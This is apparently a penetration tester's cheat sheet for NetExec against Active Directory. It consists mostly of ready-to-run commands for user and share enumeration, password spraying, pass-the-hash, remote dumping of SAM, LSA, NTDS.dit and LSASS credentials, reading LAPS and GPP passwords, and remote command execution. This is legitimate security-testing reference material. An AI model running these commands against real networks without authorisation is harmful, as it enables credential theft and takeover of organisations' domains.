+++
title = "Netexec"
+++

- https://www.netexec.wiki/getting-started/selecting-and-using-a-protocol
    - Logs: `~/.nxc/logs/`
- Cheatsheet: https://gist.github.com/strikoder/99635df00444bbf5fc90ca83ec8051a0

**NOTES:**
- by default, `netxec` attempts to authenticate with passwords or hashes at the domain level... use `--local-auth` to force local authentication, since sometimes passwords and usually hashes are different at these levels
- `(Pwn3d!)` for valid creds means an Administrator account

Netexec (formerly CrackMapExec) is a swiss army knife for pentesting networks that helps automate assessing the security of large networks in AD environments. Netexec uses `secretsdump` libraries under its hood, so it is the preferred tool for network enumeration (though `secretsdump` is still great for offline hash extraction or targeted actions)

## Protocol Selection

Netexec supports multiple protocols. Check available services with:

```bash
nxc -h
```

Common protocols include:
-     mssql               own stuff using MSSQL
-     winrm               own stuff using WINRM
-     ldap                own stuff using LDAP
-     smb                 own stuff using SMB
-     ssh                 own stuff using SSH
-     vnc                 own stuff using VNC
-     wmi                 own stuff using WMI
-     ftp                 own stuff using FTP
-     rdp                 own stuff using RDP
- And sometimes more...

## Password Policy Enumeration

Enumerate password policy information via SMB:

```bash
# Anonymous password policy enumeration
nxc smb <TARGET> --pass-pol

# Authenticated password policy enumeration
nxc smb <TARGET> -u <USER> -p <PASS> --pass-pol
```

## User Enumeration

### Enumerate Users

```bash
# Enumerate users via SMB (anonymous or authenticated)
nxc smb <TARGET> --users

# Authenticated user enumeration
nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --users
```

### Enumerate Groups

```bash
# Enumerate groups
nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --groups

# Find high value users (e.g., Domain Admins)
nxc smb <TARGET> -u <USER> -p <PASSWORD> --groups "Domain Admins"
```

## Share Enumeration

```bash
# List available shares
nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --shares

# List all files
nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" -M spider_plus --share "Departments Shares"
cat /tmp/nxc_spider_plus/*.json | python3 -m json.tool
```

## Password Spraying

Password spraying uses one password against many users (alternates users), which has **no risk of account lockout** compared to brute-forcing. This is useful as a "hail Mary" to find any way in!

**Best practice**: Obtain account lockout policy beforehand (via enumeration or asking customer); if you don't know the password policy, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset.

```bash
# Check nxc -h for services
# Password spraying (many users vs 1 password)
nxc smb <TARGET> -u <USERS> -p <PASSWORD> | grep '+'

# Local authentication (tries local authentication instead of domain authentication)
# Mitigated with: https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview
nxc smb <TARGET> -u <USERS> -p <PASSWORD> --local-auth | grep '+'
```

## Pass the Hash (PtH)

Netexec supports pass-the-hash attacks for lateral movement:

```bash
# Target can also be a subnet (CIDR)
# -d . = Local Account | -d <DOMAIN> = Domain Account
# --local-auth forces local check if implied domain fails
# :<PASS_HASH> implies empty LM hash (LM:NT)
nxc smb <TARGET> -u <USER> -d . -H <PASS_HASH> --local-auth

# Domain account with hash
nxc smb <TARGET> -u <USER> -d <DOMAIN> -H <PASS_HASH>
```

## Credential Dumping

### LSA Secrets

Remotely dump LSA secrets from a target:

```bash
# Dump LSA secrets remotely
nxc smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --lsa
```

### SAM Database

Remotely dump SAM database secrets:

```bash
# Dump SAM secrets remotely
nxc smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --sam
```

## Active Directory Operations

### NTDS Extraction

- https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit
- **NOTE:** this can sometimes crash the DC:
    - https://github.com/Pennyw0rth/NetExec/discussions/329#discussioncomment-9594340

```bash
# Extract NTDS.dit using ntdsutil module (copies NTDS.dit then parses it)
nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
```

To dump **one** account instead of the full database, add `--ntds --user <USER>`:

```bash
# Dump a specific user only (NTDS hash extraction scoped to one account)
nxc smb <TARGET> -u <USER> -p <PASSWORD> --ntds --user Administrator
nxc smb <TARGET> -u <USER> -p <PASSWORD> --ntds --user krbtgt
```

## LDAP Operations

### Admin Count Enumeration

Find high-value users with adminCount=1 (includes Domain Admins, Enterprise Admins, Backup Operators, etc.):

```bash
# Enumerate users with adminCount=1 via LDAP
nxc ldap <TARGET> -u <USER> -p <PASSWORD> --admin-count
```

## Command Execution

Sudo is **REQUIRED** because these operations act as a **server/listener**.

| `--exec-method`     | Protocol | How                       | Noise  | Port |
| ------------------- | -------- | ------------------------- | ------ | ---- |
| `wmiexec` (default) | WMI      | WMI process create        | Lower  | 135  |
| `smbexec`           | SMB      | Creates a Windows service | Medium | 445  |
| `atexec`            | SMB      | Scheduled task            | Lower  | 445  |
| `mmcexec`           | DCOM     | MMC20 DCOM object         | Lowest | 135  |

```bash
# cmd.exe
sudo nxc smb <TARGET> -u <USER> -p <PASSWORD> -x '<COMMAND>'

# PowerShell
sudo nxc smb <TARGET> -u <USER> -p <PASSWORD> -X '<COMMAND>'
```

## Modules

- https://www.netexec.wiki/getting-started/using-modules

```bash
# Show modules for protocol
nxc <PROTOCOL> -L

# Show more info for module
nxc <PROTOCOL> <MODULE> --options

# Set modules options
# NOTE: SPACE BETWEEN MODULES
nxc <PROTOCOL> <MODULE> -o <MOD_KEY>=<MOD_VALUE> <MOD_KEY>=<MOD_VALUE>,...
```

```bash
# spider_plus: Download all shares except the excluded defaults; max file size 10MB
nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=$HOME/nxc_spider MAX_FILE_SIZE=$((1024 * 1024 * 10)) EXCLUDE_FILTER='admin$,c$,ipc$,NETLOGON,SYSVOL'
```

| Module             | Command                        | Purpose                         |
| ------------------ | ------------------------------ | ------------------------------- |
| **`spider_plus`**  | `nxc smb <T> -M spider_plus`   | Crawl shares, index all files   |
| **`ntdsutil`**     | `nxc smb <T> -M ntdsutil`      | Safe NTDS dump from disk        |
| **`lsassy`**       | `nxc smb <T> -M lsassy`        | Remote LSASS dump + parse       |
| **`laps`**         | `nxc ldap <T> -M laps`         | Read LAPS passwords             |
| **`gpp_password`** | `nxc smb <T> -M gpp_password`  | GPP cpassword decrypt           |
| `ntds-dump-raw`    | `nxc smb <T> -M ntds-dump-raw` | Raw disk NTDS extraction        |
| `nanodump`         | `nxc smb <T> -M nanodump`      | Stealthier LSASS dump           |
| `gpp_autologin`    | `nxc smb <T> -M gpp_autologin` | GPP autologon creds             |
| `webdav`           | `nxc smb <T> -M webdav`        | Check if WebDAV enabled         |
| `petitpotam`       | `nxc smb <T> -M petitpotam`    | Coerce NTLM auth                |
| `nopac`            | `nxc smb <T> -M nopac`         | Check noPac/sAMAccountName vuln |
| `zerologon`        | `nxc smb <T> -M zerologon`     | Check Zerologon vuln            |